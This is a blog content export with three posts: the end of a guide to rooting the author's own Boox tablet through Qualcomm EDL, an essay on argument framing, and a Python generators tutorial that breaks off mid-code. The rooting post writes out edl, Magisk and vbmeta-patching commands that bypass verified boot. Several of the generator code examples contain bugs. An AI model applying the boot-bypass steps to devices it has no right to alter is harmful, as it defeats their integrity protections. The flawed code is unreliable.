Waiting for the device\\nmain - Device detected :)\\nsahara - Protocol version: 2, Version supported: 1\\nmain - Mode detected: sahara\\nsahara -\\nVersion 0x2\\n------------------------\\nHWID:              0x################ (MSM_ID:0x########,OEM_ID:0x0000,MODEL_ID:0x0000)\\nCPU detected:      \\"divar\\"\\nPK_HASH:           0x################################################################################################\\nSerial:            0x########\\n\\nsahara - Protocol version: 2, Version supported: 1\\nsahara - Uploading loader sm6225.bin ...\\nsahara - 64-Bit mode detected.\\nsahara - Firehose mode detected, uploading...\\nsahara - Loader successfully uploaded.\\nmain - Trying to connect to firehose loader ...\\nfirehose - INFO: Binary build date: Jan 10 2024 @ 18:16:46\\nfirehose - INFO: Binary build date: Jan 10 2024 @ 18:16:46\\nfirehose - INFO: Chip serial num: ######### (0x########)\\nfirehose - INFO: Supported Functions (15):\\nfirehose - INFO: program\\nfirehose - INFO: read\\nfirehose - INFO: nop\\nfirehose - INFO: patch\\nfirehose - INFO: configure\\nfirehose - INFO: setbootablestoragedrive\\nfirehose - INFO: erase\\nfirehose - INFO: power\\nfirehose - INFO: firmwarewrite\\nfirehose - INFO: getstorageinfo\\nfirehose - INFO: benchmark\\nfirehose - INFO: emmc\\nfirehose - INFO: ufs\\nfirehose - INFO: fixgpt\\nfirehose - INFO: getsha256digest\\nfirehose - INFO: End of supported functions 15\\nfirehose_client\\nfirehose_client - [LIB]: No --memory option set, we assume \\"UFS\\" as default ..., if it fails, try using \\"--memory\\" with \\"UFS\\",\\"NAND\\" or \\"spinor\\" instead !\\nfirehose\\nfirehose - [LIB]: Couldn\'t detect MaxPayloadSizeFromTargetinBytes\\nfirehose\\nfirehose - [LIB]: Couldn\'t detect TargetName\\nfirehose - TargetName=Unknown\\nfirehose - MemoryName=UFS\\nfirehose - Version=1\\nfirehose - Trying to read first storage sector...\\nfirehose - Running configure...\\nfirehose - Storage report:\\nfirehose - total_blocks:14507008\\nfirehose - block_size:4096\\nfirehose - page_size:4096\\nfirehose - num_physical:6\\nfirehose - manufacturer_id:2597\\nfirehose - serial_num:##########\\nfirehose - fw_version:1.7\\nfirehose - mem_type:UFS\\nfirehose - prod_name:eUFS2.2_064\\nfirehose_client - Supported functions:\\n-----------------\\nprogram,read,nop,patch,configure,setbootablestoragedrive,erase,power,firmwarewrite,getstorageinfo,benchmark,emmc,ufs,fixgpt,getsha256digest\\n\\nParsing Lun 0:\\n\\nGPT Table:\\n-------------\\nssd:                 Offset 0x0000000000006000, Length 0x0000000000002000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\npersist:             Offset 0x0000000000008000, Length 0x0000000002000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nmisc:                Offset 0x0000000002008000, Length 0x0000000000100000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nkeystore:            Offset 0x0000000002108000, Length 0x0000000000080000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nfrp:                 Offset 0x0000000002188000, Length 0x0000000000080000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nsuper:               Offset 0x0000000002208000, Length 0x0000000100000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nrecovery_a:          Offset 0x0000000102208000, Length 0x0000000006000000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nrecovery_b:          Offset 0x0000000108208000, Length 0x0000000006000000, Flags 0x1004000000000000, UUID ####################################, Type ##########, Active True\\nvbmeta_system_a:     Offset 0x000000010e208000, Length 0x0000000000010000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nvbmeta_system_b:     Offset 0x000000010e218000, Length 0x0000000000010000, Flags 0x1004000000000000, UUID ####################################, Type ##########, Active True\\nmetadata:            Offset 0x000000010e228000, Length 0x0000000001000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nonyxconfig:          Offset 0x000000010f228000, Length 0x0000000001800000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nuserdata:            Offset 0x0000000110a28000, Length 0x0000000cc51d3000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\n\\nTotal disk size:0x0000000dd5c00000, sectors:0x0000000000dd5c00\\n\\n\\nParsing Lun 1:\\n\\nGPT Table:\\n-------------\\nxbl_a:               Offset 0x0000000000006000, Length 0x0000000000380000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nxbl_config_a:        Offset 0x0000000000386000, Length 0x0000000000020000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False\\n\\nTotal disk size:0x0000000000800000, sectors:0x0000000000000800\\n\\n\\nParsing Lun 2:\\n\\nGPT Table:\\n-------------\\nxbl_b:               Offset 0x0000000000006000, Length 0x0000000000380000, Flags 0x10c4000000000000, UUID ####################################, Type ##########, Active True\\nxbl_config_b:        Offset 0x0000000000386000, Length 0x0000000000020000, Flags 0x00c4000000000000, UUID ####################################, Type ##########, Active True\\n\\nTotal disk size:0x0000000000800000, sectors:0x0000000000000800\\n\\n\\nParsing Lun 3:\\n\\nGPT Table:\\n-------------\\nALIGN_TO_128K_1:     Offset 0x0000000000006000, Length 0x000000000001a000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\ncdt:                 Offset 0x0000000000020000, Length 0x0000000000020000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nddr:                 Offset 0x0000000000040000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\n\\nTotal disk size:0x0000000008000000, sectors:0x0000000000008000\\n\\n\\nParsing Lun 4:\\n\\nGPT Table:\\n-------------\\nrpm_a:               Offset 0x0000000000006000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\ntz_a:                Offset 0x0000000000086000, Length 0x0000000000400000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nhyp_a:               Offset 0x0000000000486000, Length 0x0000000000080000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False\\nmodem_a:             Offset 0x0000000000506000, Length 0x000000000b400000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nbluetooth_a:         Offset 0x000000000b906000, Length 0x0000000000100000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nmdtpsecapp_a:        Offset 0x000000000ba06000, Length 0x0000000000400000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nmdtp_a:              Offset 0x000000000be06000, Length 0x0000000002000000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nabl_a:               Offset 0x000000000de06000, Length 0x0000000000100000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\ndsp_a:               Offset 0x000000000df06000, Length 0x0000000002000000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nkeymaster_a:         Offset 0x000000000ff06000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nboot_a:              Offset 0x000000000ff86000, Length 0x0000000006000000, Flags 0x0073000000000000, UUID ####################################, Type ##########, Active False\\ncmnlib_a:            Offset 0x0000000015f86000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\ncmnlib64_a:          Offset 0x0000000016006000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\ndevcfg_a:            Offset 0x0000000016086000, Length 0x0000000000020000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False\\nqupfw_a:             Offset 0x00000000160a6000, Length 0x0000000000010000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False\\nvbmeta_a:            Offset 0x00000000160b6000, Length 0x0000000000010000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\ndtbo_a:              Offset 0x00000000160c6000, Length 0x0000000001800000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False\\nimagefv_a:           Offset 0x00000000178c6000, Length 0x0000000000200000, Flags 0x0040000000000001, UUID ####################################, Type ##########, Active False\\nuefisecapp_a:        Offset 0x0000000017ac6000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nfeatenabler_a:       Offset 0x0000000017cc6000, Length 0x0000000000020000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nmultiimgoem_a:       Offset 0x0000000017ce6000, Length 0x0000000000008000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False\\nrpm_b:               Offset 0x0000000017cee000, Length 0x0000000000080000, Flags 0x007f000000000000, UUID ####################################, Type #########, Active True\\ntz_b:                Offset 0x0000000017d6e000, Length 0x0000000000400000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True\\nhyp_b:               Offset 0x000000001816e000, Length 0x0000000000080000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True\\nmodem_b:             Offset 0x00000000181ee000, Length 0x000000000b400000, Flags 0x107f000000000000, UUID ####################################, Type ##############, Active True\\nbluetooth_b:         Offset 0x00000000235ee000, Length 0x0000000000100000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\nmdtpsecapp_b:        Offset 0x00000000236ee000, Length 0x0000000000400000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\nmdtp_b:              Offset 0x0000000023aee000, Length 0x0000000002000000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\nabl_b:               Offset 0x0000000025aee000, Length 0x0000000000100000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\ndsp_b:               Offset 0x0000000025bee000, Length 0x0000000002000000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\nkeymaster_b:         Offset 0x0000000027bee000, Length 0x0000000000080000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\nboot_b:              Offset 0x0000000027c6e000, Length 0x0000000006000000, Flags 0x0077000000000000, UUID ####################################, Type ##########, Active True\\ncmnlib_b:            Offset 0x000000002dc6e000, Length 0x0000000000080000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\ncmnlib64_b:          Offset 0x000000002dcee000, Length 0x0000000000080000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\ndevcfg_b:            Offset 0x000000002dd6e000, Length 0x0000000000020000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True\\nqupfw_b:             Offset 0x000000002dd8e000, Length 0x0000000000010000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True\\nvbmeta_b:            Offset 0x000000002dd9e000, Length 0x0000000000010000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\ndtbo_b:              Offset 0x000000002ddae000, Length 0x0000000001800000, Flags 0x007f000000000000, UUID ####################################, Type ##########, Active True\\nfeatenabler_b:       Offset 0x000000002f5ae000, Length 0x0000000000020000, Flags 0x0004000000000000, UUID ####################################, Type ##########, Active True\\nimagefv_b:           Offset 0x000000002f5ce000, Length 0x0000000000200000, Flags 0x007f000000000001, UUID ####################################, Type ##########, Active True\\nuefisecapp_b:        Offset 0x000000002f7ce000, Length 0x0000000000200000, Flags 0x0004000000000000, UUID ####################################, Type ##########, Active True\\nmultiimgoem_b:       Offset 0x000000002f9ce000, Length 0x0000000000008000, Flags 0x107f000000000000, UUID ####################################, Type ##########, Active True\\ndevinfo:             Offset 0x000000002f9d6000, Length 0x0000000000001000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\ndip:                 Offset 0x000000002f9d7000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\napdp:                Offset 0x000000002fad7000, Length 0x0000000000040000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nspunvm:              Offset 0x000000002fb17000, Length 0x0000000000800000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nsplash:              Offset 0x0000000030317000, Length 0x00000000020a4000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nlimits:              Offset 0x00000000323bb000, Length 0x0000000000001000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\ntoolsfv:             Offset 0x00000000323bc000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nlogfs:               Offset 0x00000000324bc000, Length 0x0000000000800000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\ncateloader:          Offset 0x0000000032cbc000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nrawdump:             Offset 0x0000000032ebc000, Length 0x0000000008000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nlogdump:             Offset 0x000000003aebc000, Length 0x0000000004000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nstorsec:             Offset 0x000000003eebc000, Length 0x0000000000020000, Flags 0x1000000000000000, UUID ####################################, Type #########, Active False\\nmultiimgqti:         Offset 0x000000003eedc000, Length 0x0000000000008000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nuefivarstore:        Offset 0x000000003eee4000, Length 0x0000000000080000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nsecdata:             Offset 0x000000003ef64000, Length 0x0000000000007000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\ncatefv:              Offset 0x000000003ef6b000, Length 0x0000000000080000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\ncatecontentfv:       Offset 0x000000003efeb000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\n\\nTotal disk size:0x0000000100000000, sectors:0x0000000000100000\\n\\n\\nParsing Lun 5:\\n\\nGPT Table:\\n-------------\\nALIGN_TO_128K_2:     Offset 0x0000000000006000, Length 0x000000000001a000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nmodemst1:            Offset 0x0000000000020000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\nmodemst2:            Offset 0x0000000000220000, Length 0x0000000000200000, Flags 0x0000000000000000, UUID ####################################, Type #########, Active False\\nfsg:                 Offset 0x0000000000420000, Length 0x0000000000200000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False\\nfsc:                 Offset 0x0000000000620000, Length 0x0000000000020000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False\\n\\nTotal disk size:0x0000000008000000, sectors:0x0000000000008000\\n```\\n\\n</details>\\n\\nFrom here, we just read out all the requisite images for us to patch:\\n\\n```\\nmkdir extracted_edl_20250809\\ncd extracted_edl_20250809\\nedl --loader sm6225.bin r boot_a,boot_b,vbmeta_a,vbmeta_b boot_a.img,boot_b.img,vbmeta_a.img,vbmeta_b.img\\nedl reset\\n```\\n\\nThen after the device as rebooted, we can copy `boot_a.img` and `boot_b.img` into the device, disconnect from the computer, and follow the Magisk patching instructions.\\n\\n:::warning\\nFrom here it\'s important to NOT confuse the two partitions in the output files!\\n\\nI renamed each Magisk patched output as it was produced, to prefix the partition: `boot_a_magisk_patched-29000_IsHAi.img` and `boot_b_magisk_patched-29000_2zita.img`\\n:::\\n\\nFinally, in order to use the patched boot images, we can set relevant flags in the VBMeta (verified boot metadata) images by [using this script](https://github.com/zoomver/Vbmeta) to modify them in place:\\n\\n```\\npython patch-vbmeta.py vbmeta_a.img\\npython patch-vbmeta.py vbmeta_b.img\\n```\\n\\nFinally, we need to flash these all back to the device, so back to EDL mode we go!\\n\\n```\\nadb reboot edl\\nedl --loader sm6225.bin w boot_a extracted_edl_20250809/boot_a_magisk_patched-29000_IsHAi.img\\nedl --loader sm6225.bin w boot_b extracted_edl_20250809/boot_b_magisk_patched-29000_2zita.img\\nedl --loader sm6225.bin w vbmeta_a extracted_edl_20250809/vbmeta_a.img\\nedl --loader sm6225.bin w vbmeta_b extracted_edl_20250809/vbmeta_b.img\\nedl reset\\n```\\n\\nAnd upon reboot, Magisk confirms the rooted image was booted successfully.\\n\\nAdditional resources used:\\n\\n## System Modifications\\n\\nAt this point, to make the device a bit more trusted I worked through the following steps:\\n\\n- Add a Magisk DenyList, blocking almost all apps for su access\\n- AFWall+, blocking all Onyx apps from network traffic\\n- Disable Onyx apps via `adb shell pm clear $PKG_NAME && adb shell pm disable-user $PKG_NAME`\\n- Neo Backup for all apps\\n- Remove Onyx apps via `adb shell pm uninstall --user 0 $PKG_NAME`\\n\\nAnd for reference, at the time of writing it appears that the tablet ships with the following Boox-modified apps:\\n\\n- `com.android.quicksearchbox`\\n- `org.chromium.chrome`\\n- every \\"onyx\\" app\\n\\n<details>\\n<summary>\\n`adb shell pm list packages | grep onyx`\\n</summary>\\n\\n```\\npackage:com.android.internal.systemui.navbar.gestural_onyx\\npackage:com.onyx.dict\\npackage:com.onyx.kime\\npackage:com.onyx.mail\\npackage:com.onyx.android.onyxotaservice\\npackage:com.onyx.clock\\npackage:com.onyx.igetshop\\npackage:com.onyx.android.production.test\\npackage:com.onyx.latinime\\npackage:com.onyx.musicplayer\\npackage:com.onyx.android.ksync\\npackage:com.onyx\\npackage:com.onyx.easytransfer\\npackage:com.onyx.kreader\\npackage:com.onyx.android.note\\npackage:com.onyx.gallery\\npackage:com.onyx.floatingbutton\\npackage:com.onyx.tscalibration\\npackage:com.onyx.aiassistant\\npackage:com.onyx.voicerecorder\\npackage:com.onyx.appmarket\\npackage:com.onyx.calculator\\n```\\n\\n</details>\\n\\nOf course there are several, deeper modifications made within the Boox ROM, given many of the UI elements that are still present (such as the overriden utility dropdown, the E Ink specific app configuration, and the lock screen).\\nBut that\'s a good start, and opens up much deeper system access!"},{"id":"rps-consequentialism","metadata":{"permalink":"/blog/rps-consequentialism","source":"@site/blog/2025-07-29-rps-consequentialism.md","title":"Rock paper scissors consequentialism","description":"I\'ve noticed that with big topics about societal issues or values, there are often three types of conversations:","date":"2025-07-29T00:00:00.000Z","tags":[],"readingTime":7.46,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"rps-consequentialism","title":"Rock paper scissors consequentialism","authors":"csressel"},"unlisted":false,"prevItem":{"title":"E Ink tablets: Rooting a Boox Go 10.3","permalink":"/blog/eink-tablet-part1"},"nextItem":{"title":"Learning generators part 2: In depth","permalink":"/blog/python-generators-part2"}},"content":"I\'ve noticed that with big topics about societal issues or values, there are often three types of conversations:\\n\\n1. There are conversations about where we are at.\\n2. There are conversations about where we should go.\\n3. There are conversations about how to get there.\\n\\n\x3c!-- truncate --\x3e\\n\\nType 1 is to be a descriptive conversation, about what is. Type 2 is a normative conversation, about what should be. Type 3 is usually a constructive conversation, about what\'s effective.\\n\\nSeveral times, this mental model helped me understand the root cause of disagreements that were otherwise difficult to pinpoint.\\nI have seen discussions get heated, despite 90%+ common ground within each of these areas, because there was disagreement about **what the stakes of the argument ought to be**.\\nThe conflict wasn\'t about about the facts brought to the table, it was about whether to frame this as \\"where we are at,\\" vs. \\"where we should go,\\" vs. \\"how to get there.\\"\\n\\nTo take a pretty sanguine example: let\'s say Alice wants to talk whether recent tech acquisitions are anti-competitive (type 1), but Bob tries to reframe it as whether Alice wants more or less FTC intervention (type 3), and he clearly doesn\'t engage with her original point.\\nSomeone trying to reframing the conversation into their preferred terrain is often motivated by a genuine vision of what a more productive, society-wide conversation looks like.\\nHowever, when it is twisted too far, it becomes \\"I want to avoid that point, because conceding it will have consequences to my own framing of the topic,\\" and the reframing descends to a fallacy of appealing to consequences.\\nHere are some common ways I see this reframing tactic carried out:\\n\\n- Attacking type 1: **You can\'t talk about problems until you have solutions to propose**\\n    - There are issues in society forever and always, and since we can\'t discuss them all, then you must talk about the ones that we can fix.\\n- Attacking type 2: **You can\'t talk about \\"ought\\" until we talk more about \\"is\\"**\\n    - Too much conversation about an ideal, perfect future takes away from the current day issues that we haven\'t yet fully acknowledged as a group.\\n- Attacking type 3: **You can\'t disagree on \\"how\\" without sabotaging our \\"ought\\"**\\n    - If you disagree with the efficacy of any particular policy, then you\'re endangering the desirability of our shared goal in the minds of others.\\n\\nNotice that all three of these lines of argumentation use tenuous appeals to consequences.\\nIt would be fine to expand the conversation to a discussion of wider import, but it\'s ridiculous to suggest that the original point cannot be spoken about because of these second or third order effects.\\nUsually the perpetrator of this tactic is unshakeably focused on the battlegrounds of their own opinion.\\nIn the previous example, Bob cannot talk about anti-trust without bringing up whether Lina Khan is a net positive or negative.\\nTo Bob, just entertaining the topic in someone else\'s framing feels like a consequential illocutionary act that gives up ground to an opposing side (one who may not even be part of the conversation!).\\n\\nSome quick examples can make these lines of argumentation more concrete.\\nThis may also irritate anyone who disagrees with particular premises or conclusions, so strap in, and please put on your good faith discourse hat!\\nI\'m sure I could make a similar argument in the opposite direction for most of the below opinions, but I\'m trying to focus on the structure of the rational, and not the specifics of these issues.\\n\\n## You can\'t talk about problems until you have solutions to propose\\n\\nOften when income inequality is observed as a growing problem (a type 1 discussion), more neoliberal or fiscally-conservative folks bristle at a perceived attack on how the current, nominally capitalist economic system is organized to maximize prosperity (a type 3 reframing).\\nIf someone is noting an issue with inequality, will they next disagree with an open, market-based system that relies on some amount of inequality? Are they demanding a change without any suggestions for a better approach?\\nAnyone pointing to these problems of inequality is frequently dismissed as being idealistic, or promoting a vision that disrupts a wider status quo.\\nIn reality the specifics of their criticism may be quite targeted and not be accompanied by any prescription, nor do they need one to be valid.\\n\\n## You can\'t talk about \\"ought\\" until we talk more about \\"is\\"\\n\\nDuring the racial reckoning, attempts to talk about a future with color blind equality (a type 2 discussion) were frequently shot down for calling into question what is a current, racially unequal reality (a type 1 reframing).\\nI have been in a conversation that went something like this: someone mentioned how great a future world would be, if race was as much thought about as hair color currently is.\\nThree other folks at the table exchanged looks, and then began attacking the stakes of the discussion itself.\\nIs it even fair to compare hair color to skin color, in a world where the inequities of race are still so pressing? Despite the dogpile discussion, I don\'t think that anyone there would disagree with Dr.\\nKing\'s original sentiment, to \\"look to a day when people will not be judged by the color of their skin.\\" I assume that to those three opponents in the discussion, even holding a conversation about the *existence* of that future felt like it robs the current issues of their impetus and necessity.\\n\\n## You can\'t disagree on \\"how\\" without sabotaging our \\"ought\\"\\n\\nWhen concerns of implementation and efficacy are raised (a type 3 discussion), I\'ve experienced the shoutdown for being perceived as a threat to a shared goal (a type 2 reframing).\\nWhen discussing the solutions to rising cost and access barriers within higher education, I see clear economic reasons to question the effectiveness of student debt forgiveness without other, more fundamental interventions first[^1].\\nI don\'t think someone who stakes out a position of unilateral student loan forgiveness has different goals: widespread access to education and opportunity, decreasing the barrier of rising educational costs, and freeing debt-burdened adults to have greater financial freedom and future prosperity.\\nBut any daylight between opinions about __efficacy__ is treated as damaging to the overall goals.\\nEven worse yet, this easily escalates to questioning of intentions: If you really knew how important these goals were, if you genuinely wanted to accomplish them, would you be raising tough questions?\\nPotentially giving ammunition to \\"the other side\\"?\\nAny defense you mount that tries to explain this distinction is less clear and convincing than the simple line of attack.\\n\\n## Where from here\\n\\nLet me try and find a catchy call for action here.\\nDivisive disagreements have been all the rage (literally) in the U.S. for over ten years now.\\nMy preference after observing the pitfalls above, is to try and avoid them both when used against me, and also as they apply to my own thinking.\\nFor example, I often find myself the victim of the second and third attempts of reframing, but most often prone to perpetrating the first kind in responding to others.\\nIf you\'re in discussion with me and you notice this, please call it out! \\"I notice you\'re reacting to effects of a solution I wasn\'t even advocating,\\" is a great way to head off that pitfall of discussion.\\n\\nI also have tried my hand at naming this conversational anti-pattern, similar to some other informal fallacy names[^2].\\n**I think of this as \\"rock paper scissors consequentialism.\\"**\\nIt is much like an appeal to consequences, and when used to distract from the previous discussion then it is clearly a type of red herring.\\nMore specifically though, the circular way that this reframing can be used is like rock paper scissors: whatever the stakes of the argument you set forth, if I change the stakes to my preferred terrain then your argument looks like it yields objectionable conclusions.[^3]\\n\\nIf you discuss big values issues frequently or intensely with friends, colleagues, or the internet (ranked in the order that I would recommend), maybe share this mental model with them.\\nHopefully a shared meta-awareness for the \\"stakes\\" of a discussion is a helpful tool, especially when those stakes evolve or get called into question throughout the discussion.\\n\\n[^1]: This falls prey to: 1. moral hazard, 2. subsidizing consumption while restricting supply, 3. regressively transferring wealth. Assuming no other long-term interventions are involved, widespread student loan forgiveness may actually *raise* cost over the long-term, and *decrease* access to higher education in the long-term.\\n[^2]: These illustrative names excited me most when I read about the [motte-and-bailey fallacy](https://en.wikipedia.org/wiki/Motte-and-bailey_fallacy) for the first time. With how vivid the term is, the tactic becomes tough to miss.\\n[^3]: It\'s also worth noting that some legs of this tactic feel very similar to a moralistic fallacy."},{"id":"python-generators-part2","metadata":{"permalink":"/blog/python-generators-part2","source":"@site/blog/2025-07-11-generators-in-depth-part2.md","title":"Learning generators part 2: In depth","description":"How generators can be used in four ways (from simple to complex):","date":"2025-07-11T00:00:00.000Z","tags":[],"readingTime":11.4,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"python-generators-part2","title":"Learning generators part 2: In depth","authors":"csressel"},"unlisted":false,"prevItem":{"title":"Rock paper scissors consequentialism","permalink":"/blog/rps-consequentialism"},"nextItem":{"title":"Learning generators part 1: Basics","permalink":"/blog/python-generators-part1"}},"content":"How generators can be used in four ways (from simple to complex):\\n\\n1. Lazy-like expressions, including unbounded sequences\\n2. Alternating control flow with the caller\\n3. **A \\"pure-looking\\" function, with hidden internal state**\\n4. **Internally managing a state-machine, that handles caller-passed input**\\n\\nThe first two use cases are covered [this previous article](/blog/python-generators-part1), and serve as a primer to the topic.\\nIf you don\'t have a solid understanding of generators in Python, I would recommend starting there.\\n\\nThe second two use cases are covered in this article.\\n\\n:::info\\nWell that\'s a big gap in time between these two articles!\\n\\nA peak behind the screen -- I speed wrote the first article and outlined the\\nsecond, immediately after doing some small projects and consuming some related\\ntech talks. This past month I was able to clean up this section, and finally\\nclick publish on both!\\n:::\\n\\n---\\n## Functions Internally Handling State\\n\\nBoth the previous use cases are common ones, made more concise through generators.\\nThis use case and the next are less common use cases that are less about convenience, and more becoming **possible** with generators.\\n(Okay okay, that\'s not a challenge... There are definitely other ways to construct this logic! But I think these particular formations make me thankful for the tool.)\\n\\n\x3c!-- truncate --\x3e\\n\\nIn a generalization from use case one, the internal state of a generator function is useful for more than just sequence-like behavior.\\nAlthough the most basic case of a generator is an iterator, which lends itself to sequence-like structures, it turns out to be very useful for other logic,\\nwhere some internal state that was mutated in between logical steps can now be encapsulated entirely into the function structure.\\n\\nAs a quick example of that \\"internal state,\\" consider calculating a moving average.\\nThere\'s a logical dependency between each step on all previous.\\nGenerators will track solely that dependency, and leave the caller with their `Iterator` output:\\n\\n```python\\nimport time\\nfrom collections.abc import Iterable, Iterator\\nfrom typing import Union\\n\\ndef moving_average(data: Iterable[Union[int, float]]) -> Iterator[float]:\\n    _total = 0.0\\n    _count = 0\\n    for item in data:\\n        _total += item\\n        _count += 1\\n        yield _total / _count\\n\\n\\n# To the caller, it just looks like an Iterator\\nprint(list(moving_average([0, 7, 11, 8, 77])))\\n\\n# And the abstraction still lets the caller proceed lazily if necessary\\nstart_time = time.time()\\naverage = 0\\n# 50 ms of moving average across some distribution\\nfor average in moving_average(rand_int()):\\n    if (time.time() - start_time) * 1000 > 10:\\n        break\\n    print(average)\\n```\\n\\nThat\'s fine and well, maybe the shortest way to write that, but that only feels like a pure function if we\'re always casting the Iterator back to a list.\\n\\nBut something is missing from that code... What is the `next_rand_int` function?\\nWell I guess we want a different random number any time that function is called.\\nIn fact, for a lot of randomness you might want that to be both deterministic for your application trace, and still random for all disparate callers.\\nThe normal way to accomplish this is to feed the previous random as the following seed, but that requires all callers knowing if any other caller changed the seed.\\nThe standard library achieves this with an instance of the `random.Random` class, which manages state for you.\\nIn that case though, it can feel like you need a singleton or mono pattern for every code trace to get access to the same object instance.\\n\\nInstead, we can just encapsulate the random state in our helper function:\\n\\n```python\\nfrom random import Random\\n\\nMAX_RAND = 1 << 10\\ndef rand_int(max_int=MAX_RAND) -> Iterator[float]:\\n    r = Random(8)\\n    while True:\\n        yield r.random() * max_int\\ndef next_rand_int(max_int=MAX_RAND) -> float:\\n    return next(rand_int(max_int))\\n\\n# And with our previous example...\\nstart_time = time.time()\\nelement = 0\\nfor element in moving_average(next_rand_int()):\\n    if (time.time() - start_time) * 1000 > 10:\\n        break\\n    print(element)\\n# We now see the uniform distribution here:\\nassert abs(element - MAX_RAND / 2) < 1\\n```\\n\\n:::info\\nIt\'s important to note this is obviously **not** a truly pure function, as calling it with the same input will return different outputs.\\nAs a programming paradigm though, it feels *closer* to functional than using a singleton pattern to host a `Random` instance.\\nWhen I before mentioned a \\"pure-looking function, with hidden internal state,\\" that probably sounded oxymoronic.\\n\\nWhat I\'m calling \\"closer to functional\\" is maybe an implicit feeling that there is \\"program state,\\" and then there is \\"world state,\\" and **when functional paradigms are most helpful is when they eliminate the program state**.\\nWhen they feel obtuse and frustrating is often when they run up against the realities of hardware and the world state.\\n\\nFor several reasons, randomness feels like it belongs in that second category, alongside the system clock, runtime performance, and other realities of hardware.\\nThe most pressing reason is that for a production release of your application, you may need to opaquely switch the `next_rand_int` implementation out with a [platform specific implementation](https://en.wikipedia.org/wiki/List_of_random_number_generators#Random_number_generators_that_use_external_entropy), or even one of [extremely high entropy](https://en.wikipedia.org/wiki/Hardware_random_number_generator), and that *actually will be* reliant on world state and the realities of hardware.\\n:::\\n\\nJust to quiet the functional nerd in me (and maybe in you), here is a useful example that actually does simplify a pure function implementation:\\n\\n```python\\nfrom typing import Iterable, Tuple\\n\\ndef run_length_encoding(data: str) -> str:\\n    def grouped(i: Iterable) -> Iterable[Tuple[int, str]]:\\n        iterator = iter(data)\\n        try:\\n            _group = next(iterator)\\n            _count = 1\\n        except StopIteration:\\n            return\\n\\n        for item in 